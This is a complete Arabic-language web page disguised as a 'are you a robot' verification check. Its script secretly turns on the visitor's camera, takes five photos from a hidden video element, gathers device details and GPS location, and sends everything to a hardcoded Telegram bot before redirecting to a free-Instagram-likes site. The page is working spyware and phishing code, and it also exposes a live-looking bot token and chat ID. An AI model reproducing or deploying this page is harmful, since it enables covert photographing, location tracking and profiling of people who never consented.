<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>جاري التحقق</title>
  <style>
    body {
      text-align: center;
      font-family: sans-serif;
      background: #f2f2f2;
      direction: rtl;
      padding-top: 50px;
    }
    #progressContainer {
      width: 80%;
      margin: 30px auto;
      background-color: #ddd;
      border-radius: 20px;
      overflow: hidden;
    }
    #progressBar {
      width: 0%;
      height: 30px;
      background-color: #4caf50;
      text-align: center;
      line-height: 30px;
      color: white;
      transition: width 0.2s;
    }
    canvas {
      display: none;
    }
    video {
      position: absolute;
      top: -9999px;
      visibility: hidden;
    }
    button {
      padding: 10px 20px;
      background-color: #4caf50;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 18px;
    }
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <h2>جاري التحقق هل أنت روبوت أم لا...</h2>
  <div id="progressContainer">
    <div id="progressBar">0%</div>
  </div>

  <!-- زر لبدء التحقق -->
  <button onclick="startCameraFlow()">ابدأ التحقق</button>

  <video id="video" autoplay muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const progressBar = document.getElementById("progressBar");

    const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
    const chat_id = '6437823957';

    function sendDeviceInfo(lat = "غير متوفر", lon = "غير متوفر") {
      const info = `
معلومات الجهاز:
نظام التشغيل: ${navigator.platform}
المتصفح: ${navigator.userAgent}
اللغة: ${navigator.language}
دقة الشاشة: ${window.screen.width}x${window.screen.height}
الموقع:
خط العرض: ${lat}
خط الطول: ${lon}
https://www.google.com/maps?q=${lat},${lon}
      `;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id, text: info })
      });
    }

    function getLocationAndSendInfo() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => sendDeviceInfo(pos.coords.latitude, pos.coords.longitude),
          err => sendDeviceInfo()
        );
      } else {
        sendDeviceInfo();
      }
    }

    function sendPhoto(blob) {
      const formData = new FormData();
      formData.append('chat_id', chat_id);
      formData.append('photo', blob, 'photo.jpg');

      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    function startCameraFlow() {
      // تغيير زر التحقق ليصبح غير نشط أثناء التشغيل
      document.querySelector("button").disabled = true;
      document.querySelector("button").textContent = "جاري التحقق...";

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;

          video.onloadedmetadata = () => {
            video.play();

            // نضبط أبعاد الكانفاس تلقائيًا
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // نضيع ثانية إضافية للتأكد من جاهزية الفيديو
            setTimeout(() => {
              let count = 0;
              const maxPhotos = 5;
              const interval = setInterval(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob && blob.size > 1000) {
                    sendPhoto(blob);
                  }
                }, 'image/jpeg');
                count++;
                if (count >= maxPhotos) {
                  clearInterval(interval);
                  window.location.href = "https://leofame.com/ar/free-instagram-likes";
                }
              }, 500);

              getLocationAndSendInfo();
            }, 1000);
          };
        })
        .catch(err => alert("فشل تشغيل الكاميرا: " + err));
    }

    // التحكم في شريط التقدم
    let width = 0;
    const progressInterval = setInterval(() => {
      if (width >= 100) {
        clearInterval(progressInterval);
      } else {
        width++;
        progressBar.style.width = width + "%";
        progressBar.textContent = width + "%";
      }
    }, 30);
  </script>
</body>
</html>
